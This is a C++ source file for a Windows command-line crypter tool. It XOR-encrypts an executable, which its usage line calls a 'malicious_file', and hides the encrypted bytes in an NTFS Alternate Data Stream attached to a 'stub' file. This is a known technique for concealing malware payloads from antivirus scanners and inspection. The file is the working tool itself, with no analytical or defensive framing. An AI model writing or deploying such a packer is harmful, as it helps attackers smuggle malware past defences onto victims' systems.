#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#define NOMINMAX
#include <windows.h>

// Function to encrypt/decrypt a file using XOR
bool xorFile(const std::string& inputFile, const std::string& key, std::vector<BYTE>& encryptedData) {
    std::ifstream inFile(inputFile, std::ios::binary);
    if (!inFile) {
        std::cerr << "Error: Could not open the input file." << std::endl;
        return false;
    }

    std::vector<BYTE> buffer(std::istreambuf_iterator<char>(inFile), {});
    inFile.close();

    if (buffer.size() < 2 || buffer[0] != 0x4D || buffer[1] != 0x5A) {
        std::cerr << "Warning: The file does not appear to be a valid executable (missing MZ header)." << std::endl;
        std::cout << "Do you want to continue anyway? (y/n): ";
        char response;
        std::cin >> response;
        if (response != 'y' && response != 'Y') {
            return false;
        }
    }
    else {
        std::cout << "Valid executable detected (MZ header present)." << std::endl;
    }

    encryptedData.resize(buffer.size());
    for (size_t i = 0; i < buffer.size(); ++i) {
        encryptedData[i] = buffer[i] ^ key[i % key.length()];
    }

    std::cout << "XOR operation completed successfully." << std::endl;
    std::cout << "File size: " << buffer.size() << " bytes" << std::endl;

    return true;
}

bool saveToADS(const std::string& stubPath, const std::string& streamName, const std::vector<BYTE>& data) {
    std::string adsPath = stubPath + ":" + streamName;
    HANDLE hFile = CreateFileA(adsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Could not create the Alternate Data Stream." << std::endl;
        return false;
    }

    DWORD bytesWritten;
    BOOL result = WriteFile(hFile, data.data(), data.size(), &bytesWritten, NULL);
    CloseHandle(hFile);

    if (!result || bytesWritten != data.size()) {
        std::cerr << "Error: Could not write all data to the ADS." << std::endl;
        return false;
    }

    std::cout << "Data saved to ADS: " << adsPath << std::endl;
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cout << "Usage: " << argv[0] << " [malicious_file] [stub_file] [key]" << std::endl;
        return 1;
    }

    std::string inputFile = argv[1];
    std::string stubFile = argv[2];
    std::string key = argv[3];
    std::string streamName = "encrypted";

    std::vector<BYTE> encryptedData;

    if (!xorFile(inputFile, key, encryptedData)) {
        return 1;
    }

    if (!saveToADS(stubFile, streamName, encryptedData)) {
        return 1;
    }

    std::cout << "Process completed. The encrypted file has been saved inside the stub as an ADS." << std::endl;
    return 0;
}